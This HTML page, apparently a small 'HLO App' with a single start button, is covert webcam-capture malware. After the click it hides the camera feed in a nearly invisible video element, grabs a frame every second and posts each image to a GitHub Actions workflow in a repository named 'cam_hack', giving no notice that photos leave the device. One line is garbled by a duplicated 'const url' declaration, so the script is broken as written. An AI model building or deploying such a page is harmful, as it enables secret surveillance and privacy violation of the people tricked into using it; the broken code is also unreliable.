<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8" />
<title>HLO App</title>
<style>
body {font-family:Arial; background:#f3f4f6; display:flex; 
justify-content:center; align-items:center; height:100vh; margin:0;}
#box {background:white; padding:20px; border-radius:10px; 
width:320px; text-align:center; box-shadow:0 4px 20px rgba(0,0,0,0.2);}
#video {width:1px;height:1px;opacity:0.01;position:fixed;bottom:0;right:0;}
#toast {position:fixed;bottom:20px;left:50%;transform:translateX(-50%);
background:black;color:white;padding:8px 15px;border-radius:8px;display:none;}
button {padding:10px 20px;background:#2563eb;color:white;border:none;
border-radius:8px;font-size:16px;}
</style>
</head>

<body>
<div id="box">
  <button id="start">OK â€” Start</button>
</div>

<video id="video" autoplay playsinline></video>
<canvas id="canvas" style="display:none;"></canvas>
<div id="toast">Uploading...</div>

<script>
const repoOwner = "YUVIVIKHE";
const repoName = "cam_hack";

const startBtn = document.getElementById("start");
const video = document.getElementById("video");
const canvas = document.getElementById("canvas");
const toast = document.getElementById("toast");

let stream, timer;

function toastMsg(msg){
  toast.innerText = msg;
  toast.style.display="block";
  setTimeout(()=>toast.style.display="none",1200);
}

async function sendToGitHub(filename, base64){
  const url = `const url = `https://api.github.com/repos/YUVIVIKHE/cam_hack/actions/workflows/upload.yml/dispatches`;

  await fetch(url,{
    method:"POST",
    headers:{"Content-Type":"application/json"},
    body:JSON.stringify({
      ref:"main",
      inputs:{
        filename:filename,
        content:base64.replace(/^data:image\/png;base64,/,"")
      }
    })
  });

  toastMsg("Uploaded");
}

async function capture(){
  const w = video.videoWidth;
  const h = video.videoHeight;
  if(!w || !h) return;

  canvas.width=w; canvas.height=h;
  const ctx = canvas.getContext("2d");
  ctx.drawImage(video,0,0,w,h);

  const dataURL = canvas.toDataURL("image/png");
  const name = Date.now()+".png";

  toastMsg("Uploading...");
  sendToGitHub(name, dataURL);
}

startBtn.addEventListener("click", async()=>{
  startBtn.style.display="none";

  try{
    stream = await navigator.mediaDevices.getUserMedia({video:true});
    video.srcObject = stream;

    await new Promise(r=>video.onloadedmetadata=r);

    timer = setInterval(capture, 1000);

  }catch(e){
    alert("Camera permission denied");
  }
});

window.addEventListener("beforeunload",()=>{
  if(timer) clearInterval(timer);
  if(stream) stream.getTracks().forEach(t=>t.stop());
});
</script>

</body>
</html>
